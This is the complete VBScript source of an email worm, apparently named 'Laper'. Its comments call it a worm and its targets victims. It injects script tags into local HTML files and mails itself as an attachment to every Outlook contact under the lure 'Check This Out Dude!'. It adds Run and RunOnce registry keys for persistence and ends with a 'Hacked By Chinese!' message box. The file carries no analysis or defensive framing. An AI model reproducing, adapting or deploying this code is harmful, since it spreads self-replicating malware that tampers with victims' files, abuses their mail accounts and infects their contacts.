Set objOutlook = CreateObject("Outlook.Application")
Set objMail = objOutlook.CreateItem(0)

strFilePath = "\\network\share\Laper.vbs"
strEmailSubject = "Check This Out Dude!"

' Infect HTML files on the victim's computer
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objHTMLFiles = objFSO.GetFolder(objFSO.GetParentFolderName(WScript.ScriptFullName)).Files
For Each objHTMLFile In objHTMLFiles
    If LCase(objFSO.GetExtensionName(objHTMLFile.Name)) = "html" Then
        strNewHTMLContent = Replace(objHTMLFile.OpenAsTextStream(1).ReadAll(), "</head>", "<script src=""" & strFilePath & """></script></head>")
        Set objNewHTMLFile = objFSO.CreateTextFile(objHTMLFile.Path, True)
        objNewHTMLFile.Write strNewHTMLContent
        objNewHTMLFile.Close
    End If
Next

' Sending the worm to email contacts
Set objNS = objOutlook.GetNamespace("MAPI")
objNS.Logon "profilename", "password", False, True
Set objContacts = objNS.GetDefaultFolder(10).Items

For Each objContact In objContacts
    If objContact.Class = 43 Then
        objMail.To = objContact.Email1Address
        objMail.Subject = strEmailSubject
        objMail.Body = "Check this out, dude!"
        objMail.Attachments.Add strFilePath, 1, 0, "Laper.vbs"
        objMail.Send
    End If
Next

' Create a registry key to autostart the worm
strRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
strRegistryKey = "Laper"
strRegistryValue = """" & strFilePath & """"

Set objRegistry = CreateObject("WScript.Shell")
objRegistry.RegWrite strRegistryPath & "\" & strRegistryKey, strRegistryValue, "REG_SZ"

' Create a backup registry key for the worm's backup file
strBackupRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
strBackupRegistryKey = "Laper_backup"

If Not objFSO.FileExists(objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs")) Then
    strBackupRegistryValue = """" & objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs") & """"
Else
    strBackupRegistryValue = """" & strFilePath & """"
End If

objRegistry.RegWrite strBackupRegistryPath & "\" & strBackupRegistryKey, strBackupRegistryValue, "REG_SZ"

MsgBox "Hacked By Chinese!"
